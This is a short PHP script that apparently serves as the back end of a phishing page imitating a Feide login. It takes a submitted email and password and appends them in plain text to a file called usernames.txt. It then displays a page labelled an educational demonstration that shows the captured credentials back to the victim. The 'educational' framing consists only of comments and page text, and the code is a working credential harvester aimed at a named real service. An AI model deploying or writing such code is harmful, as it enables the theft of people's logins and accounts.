<?php
// Capture the email and password from the form submission
$email = $_POST['email'];
$password = $_POST['password'];

// Log the credentials to a file for educational purposes
file_put_contents("usernames.txt", "Feide Username: " . htmlspecialchars($email) . " Pass: " . htmlspecialchars($password) . "\n", FILE_APPEND);

// Display a message to the user
echo "<h1>Educational Demonstration</h1>";
echo "<p>This is a simulated phishing attack. Your credentials were captured for educational purposes.</p>";
echo "<p>Email: " . htmlspecialchars($email) . "</p>";
echo "<p>Password: " . htmlspecialchars($password) . "</p>";
echo "<p>Always be cautious of fake login pages and never enter your real credentials on untrusted sites.</p>";
?>
